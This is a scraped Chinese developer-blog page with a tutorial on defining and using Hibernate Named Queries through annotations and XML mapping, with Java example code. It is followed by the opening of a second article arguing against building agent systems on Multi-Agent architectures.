                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Hibernate的Named Query</h3>
<p>Named Query（命名查询）是Hibernate提供的一种机制，允许开发者在实体类或映射文件中定义静态的SQL或HQL查询。命名查询的好处包括：</p>
<ul>
<li>代码复用：可以在多个地方使用相同的查询。</li>
<li>预编译：命名查询在应用启动时被预编译，运行时性能更好。</li>
<li>可维护性：查询逻辑分离，便于维护和管理。</li>
</ul>
<h3 data-id="heading-1">定义Named Query</h3>
<p>Named Query可以使用注解或XML配置来定义：</p>
<ol>
<li><strong>注解方式</strong>：
<ul>
<li>使用<code>@NamedQuery</code>和<code>@NamedQueries</code>注解。</li>
</ul>
</li>
<li><strong>XML配置方式</strong>：
<ul>
<li>在Hibernate的映射文件中使用<code>&lt;query&gt;</code>标签。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">示例代码</h3>
<h4 data-id="heading-3">使用注解定义Named Query</h4>
<h5 data-id="heading-4">实体类 <code>Person</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "person")</span>
<span class="hljs-meta">@NamedQueries({
    @NamedQuery(
        name = "Person.findByName",
        query = "FROM Person WHERE name = :name"
    ),
    @NamedQuery(
        name = "Person.findAll",
        query = "FROM Person"
    )
})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "age")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// Getters 和 Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h4 data-id="heading-5">使用XML配置定义Named Query</h4>
<h5 data-id="heading-6">配置文件 <code>Person.hbm.xml</code></h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-mapping</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Mapping DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-mapping</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">class</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"com.example.domain.Person"</span> <span class="hljs-attr">table</span>=<span class="hljs-string">"person"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"id"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">generator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"identity"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"name"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"age"</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"age"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Named Queries --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findByName"</span>&gt;</span>
        &lt;![CDATA[
            FROM Person WHERE name = :name
        ]]&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findAll"</span>&gt;</span>
        &lt;![CDATA[
            FROM Person
        ]]&gt;
    <span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-mapping</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7">使用Named Query示例</h4>
<h5 data-id="heading-8">HibernateUtil类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h5 data-id="heading-9">查询示例</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.query.Query;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateNamedQueryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入示例数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 使用Named Query查询数据</span>
        queryByName(sessionFactory, <span class="hljs-string">"John Doe"</span>);
        queryAll(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">30</span>);
            <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Jane Doe"</span>, <span class="hljs-number">28</span>);

            session.save(person1);
            session.save(person2);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryByName</span><span class="hljs-params">(SessionFactory sessionFactory, String name)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            Query&lt;Person&gt; query = session.createNamedQuery(<span class="hljs-string">"Person.findByName"</span>, Person.class);
            query.setParameter(<span class="hljs-string">"name"</span>, name);
            List&lt;Person&gt; persons = query.getResultList();
            System.out.println(<span class="hljs-string">"Query by name ("</span> + name + <span class="hljs-string">"):"</span>);
            <span class="hljs-keyword">for</span> (Person person : persons) {
                System.out.println(person.getName() + <span class="hljs-string">" - "</span> + person.getAge());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryAll</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            Query&lt;Person&gt; query = session.createNamedQuery(<span class="hljs-string">"Person.findAll"</span>, Person.class);
            List&lt;Person&gt; persons = query.getResultList();
            System.out.println(<span class="hljs-string">"Query all persons:"</span>);
            <span class="hljs-keyword">for</span> (Person person : persons) {
                System.out.println(person.getName() + <span class="hljs-string">" - "</span> + person.getAge());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-10">Named Query详细解释</h3>
<ol>
<li>
<p><strong>注解方式定义Named Query</strong>：在<code>Person</code>实体类上使用<code>@NamedQuery</code>和<code>@NamedQueries</code>注解定义查询。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NamedQueries({
    @NamedQuery(
        name = "Person.findByName",
        query = "FROM Person WHERE name = :name"
    ),
    @NamedQuery(
        name = "Person.findAll",
        query = "FROM Person"
    )
})</span>
</code></pre>
</li>
<li>
<p><strong>XML配置方式定义Named Query</strong>：在<code>Person.hbm.xml</code>中使用<code>&lt;query&gt;</code>标签定义查询。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findByName"</span>&gt;</span>
    &lt;![CDATA[
        FROM Person WHERE name = :name
    ]]&gt;
<span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Person.findAll"</span>&gt;</span>
    &lt;![CDATA[
        FROM Person
    ]]&gt;
<span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span>
</code></pre>
</li>
<li>
<p><strong>HibernateUtil类</strong>：创建并管理SessionFactory。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
</li>
<li>
<p><strong>使用Named Query示例</strong>：演示如何使用Named Query进行查询。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateNamedQueryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入示例数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 使用Named Query查询数据</span>
        queryByName(sessionFactory, <span class="hljs-string">"John Doe"</span>);
        queryAll(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">30</span>);
            <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Jane Doe"</span>, <span class="hljs-number">28</span>);

            session.save(person1);
            session.save(person2);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryByName</span><span class="hljs-params">(SessionFactory sessionFactory, String name)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            Query&lt;Person&gt; query = session.createNamedQuery(<span class="hljs-string">"Person.findByName"</span>, Person.class);
            query.setParameter(<span class="hljs-string">"name"</span>, name);
            List&lt;Person&gt; persons = query.getResultList();
            System.out.println(<span class="hljs-string">"Query by name ("</span> + name + <span class="hljs-string">"):"</span>);
            <span class="hljs-keyword">for</span> (Person person : persons) {
                System.out.println(person.getName() + <span class="hljs-string">" - "</span> + person.getAge());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }

</code></pre>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么不建议基于Multi-Agent来构建Agent工程？]]></title>    <link>https://juejin.cn/post/7592822714067877939</link>    <guid>https://juejin.cn/post/7592822714067877939</guid>    <pubDate>2026-01-08T12:20:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592822714067877939" data-draft-id="7592816646870597641" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么不建议基于Multi-Agent来构建Agent工程？"/> <meta itemprop="keywords" content="Agent,后端,人工智能"/> <meta itemprop="datePublished" content="2026-01-08T12:20:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序新视界"/> <meta itemprop="url" content="https://juejin.cn/user/3368559359568696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么不建议基于Multi-Agent来构建Agent工程？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559359568696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序新视界
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:20:46.000Z" title="Thu Jan 08 2026 12:20:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>在LLM涌现的早期已经有大量的研发人员开始思考、讨论和推广Multi-Agent的概念。它的基本实现逻辑就是：利用LLLM的归纳推理能力，通过为不同的Agent分配角色与任务，并配合相应的工具（tools）插件来完成复杂的任务。</p>
<p>但经过这两三年的发展，关于Multi-Agent的讨论依旧存在截然不同的观点，真实案例更寥寥可数，也没有形成标准的行业范式。在Manus内部人员的访谈记录中，也坦言，在Manus的功能实现中并没有使用复杂的Multi-Agent工程。</p>
<p>在本人主导开发的AI原生项目中，使用了大量的基于LLM的Workflow能力，但对于Multi-Agent也是望而却步，因为实践的结果与预期的差距太大。</p>
<p>这篇文章结合国外一篇关于Multi-Agent观念，一起聊聊对于Multi-Agent的观点和看法。</p>
<h2 data-id="heading-1">Agent时代的现状</h2>
<p>随着LLM的快速突破，目前算是正式进入了LLM和AI Agent时代的早期。这个时期可以用Web开发来进行类比，就相当于正处于使用原始的HTML &amp; CSS来开发网页的时代。至于像Web开发后面的React（及其衍生框架）以及相关的脚手架、构建模式以及开发哲学等，都还处于大众探索创新的阶段。</p>
